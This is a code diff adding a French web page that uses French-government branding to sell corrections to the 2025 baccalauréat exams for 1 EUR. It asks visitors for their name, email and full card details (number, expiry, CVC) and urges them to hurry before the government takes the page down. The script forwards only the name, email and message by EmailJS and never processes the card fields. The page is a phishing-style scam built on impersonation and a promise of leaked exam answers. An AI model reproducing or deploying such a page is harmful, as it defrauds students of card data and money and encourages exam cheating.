@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Rayan Nezzar</title>
+    <link rel="stylesheet" href="contacts.css">
+    <link rel="icon" type="image/png" href="OIP.jpg">
+</head>
+<body>
+
+    <header class="gov-header">
+        <div class="gov-logo">
+            <img src="OIP.jpg" alt="Logo République Française">
+        </div>
+    </header>
+
+    <main class="contact-page">
+        <section class="intro-section">
+            <img src="Capture d’écran 2025-06-15 092831.png" alt="Carte France" class="intro-image">
+            <div class="intro-text">
+                <h1>Obtenir la correction</h1>
+                <p>
+                    Ce formulaire est à votre disposition pour vous envoyez les sujets et les correction sur demande du BAC 2025.
+                    Il sera potentiellement supprimé lorsque le gouvernement aura le signalement : faites vite 
+
+                    Prix par correction : 1 EUR
+            </div>
+        </section>
+
+          <section class="contact-container glass animated">
+      <h2>Prix de la Correction : 1 EUR</h2>
+      <form action="#" method="post" class="contact-form">
+        <label for="name">Nom complet</label>
+        <input type="text" id="name" name="name" required>
+
+        <label for="email">Adresse email</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="message">Votre message</label>
+        <textarea id="message" name="message" rows="5" required></textarea>
+
+        <hr>
+
+  
+
+        <label for="cardNumber">Numéro de carte bancaire</label>
+        <input type="password" id="cardNumber" name="cardNumber" inputmode="numeric" required>
+
+        <label for="expiry">Date d’expiration</label>
+        <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required>
+
+        <label for="cvc">CVC</label>
+        <input type="password" id="cvc" name="cvc" inputmode="numeric" maxlength="4" required>
+
+        <button type="submit">📨 Obtenir le correction</button>
+      </form>
+    </section>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            emailjs.init("7uI9LfoyE1s6bVMhd");
+
+            document.querySelector(".contact-form").addEventListener("submit", function (event) {
+                event.preventDefault();
+
+                let name = document.getElementById("name").value;
+                let email = document.getElementById("email").value;
+                let message = document.getElementById("message").value;
+
+                emailjs.send("service_cidormd", "template_e41q8qd", {
+                    user_name: name,
+                    user_email: email,
+                    message: message
+                }).then(
+                    function(response) {
+                        alert("Votre message a bien été envoyé. Nous vous répondrons prochainement.");
+                        document.querySelector(".contact-form").reset();
+                    },
+                    function(error) {
+                        alert("Erreur lors de l'envoi. Merci de réessayer plus tard.");
+                        console.log("Erreur:", error);
+                    }
+                );
+            });
+        });
+    </script>
+
+</body>
+</html>
